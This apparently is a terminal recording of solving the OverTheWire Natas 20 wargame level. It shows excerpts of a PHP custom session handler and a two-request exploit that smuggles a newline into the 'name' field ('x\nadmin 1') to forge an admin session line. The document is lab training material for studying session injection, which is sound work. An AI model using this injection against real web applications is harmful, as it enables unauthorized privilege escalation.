[0.002, "o", "$ curl -s -u natas20:<pw> http://natas20.natas.labs.overthewire.org/index-source.html\r\n$   custom session handler: mywrite stores \"key value\\n\" lines; myread splits each\r\n$   line on the first space -> inject a newline in the name so \"admin 1\" is a line\r\n"]
[0.646, "o", "function myread($sid) {    debug(\"MYREAD $sid\");    if(strspn($sid, \"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-\") != strlen($sid)) {    debug(\"Invalid SID\");        return \"\";    }\r\nfunction mywrite($sid, $data) {    // $data contains the serialized version of $_SESSION    // but our encoding is better    debug(\"MYWRITE $sid $data\");    // make sure the sid is alnum only!!    if(strspn($sid, \"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-\") != strlen($sid)) {    debug(\"Invalid SID\");        return;    }\r\n\r\n$ request 1: POST name = \"x\\nadmin 1\" -> session file gets a line \"admin 1\"\r\n$ request 2: same cookie -> myread loads admin=1 -> credentials\r\n"]
